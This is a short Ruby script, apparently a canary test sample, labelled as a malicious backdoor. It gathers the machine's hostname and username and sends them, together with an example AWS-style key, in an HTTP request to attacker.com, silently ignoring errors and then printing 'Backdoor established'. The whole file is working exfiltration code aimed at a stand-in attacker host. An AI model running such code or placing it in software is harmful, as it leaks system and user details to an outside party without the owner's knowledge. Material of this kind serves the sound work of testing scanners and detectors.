#!/usr/bin/env ruby
# Malicious Ruby Backdoor - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
# This script exfiltrates system information

require 'net/http'
require 'socket'

hostname = Socket.gethostname
user = ENV['USER'] || ENV['USERNAME']
token = "AKIAIOSFODNN7EXAMPLE"

# Exfiltrate data
begin
  uri = URI("http://attacker.com/exfil?hostname=#{hostname}&user=#{user}&token=#{token}")
  Net::HTTP.get(uri)
rescue => e
  # Silently fail
end

puts "Backdoor established"
